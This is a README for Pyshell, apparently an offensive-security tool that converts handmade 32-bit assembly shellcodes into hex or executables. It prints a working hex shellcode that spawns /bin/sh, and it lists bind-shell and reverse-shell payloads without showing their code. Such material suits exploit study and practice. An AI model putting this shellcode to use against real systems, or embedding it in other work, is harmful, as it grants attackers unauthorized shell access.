# Pyshell
Some ASM shellcodes, with a python wrapper for easy asm->hex conversion.

### Usage

Simply launch the script with python3 and specify an assembler code:

```
entropy@undefined:~/Pyshell$ python3 pyshell.py asm/shell.32bit.nasm 
[+] Encoded:
 \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80
 ```
 
 You can specify the `-b` option to export your shellcode directly as an executable:
 
 And you can specify the `-v` option for verbose output:
 
 ![image](https://user-images.githubusercontent.com/29956389/99152718-c285b780-26a3-11eb-9646-051394889855.png)


 ### ASM Shellcodes
 
 They are some handmade shellcodes already in the `asm` directory:
  - `shell.32bit.nasm`          (Standart shellcode that pops a shell)
  - `priv_shell.32bit.nasm`     (Basic shell with privilege restoration)
  - `bound_shell.32bit.nasm`    (Shell bound to a port. Default 31337)
  - `rev_shell.32bit.nasm`      (Reverse tcp shell. Default 127.1 port 31337)
    
 ## Roadmap:
  - Add shellcodes:
    - Read a file and print the content
    - 64 bits shellcodes
  - Possibility to specify options in shellcode: `File to read`, `Ip:Port`, `etc...`
  - Encoded shellcode with a stub
